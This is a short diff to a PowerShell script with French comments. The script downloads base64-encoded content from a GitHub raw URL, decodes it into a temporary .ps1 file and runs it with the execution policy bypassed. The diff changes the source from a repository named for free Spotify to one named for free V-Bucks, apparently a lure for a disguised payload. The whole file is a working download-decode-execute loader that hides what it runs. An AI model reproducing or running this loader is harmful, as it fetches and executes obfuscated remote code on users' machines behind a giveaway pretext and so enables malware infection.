@@ -2,7 +2,7 @@
 $base64Path = "$env:TEMP\encoded_base64.txt"
 
 # Télécharger le contenu base64 encodé
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SB6-ON-TOP/here-powershell-script/main/spotify-free.ps1" -OutFile $base64Path
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ZACOxZADA/free-v-v-bucks./refs/heads/main/here-powershell-script" -OutFile $base64Path
 
 # Lire le fichier base64
 $base64String = Get-Content -Path $base64Path -Raw
@@ -20,4 +20,5 @@ $scriptPath = "$env:TEMP\script_decoded.ps1"
 Set-Content -Path $scriptPath -Value $decodedScript -Encoding UTF8
 
 # Exécuter le script avec bypass de politique d'exécution
+
 powershell.exe -ExecutionPolicy Bypass -File $scriptPath
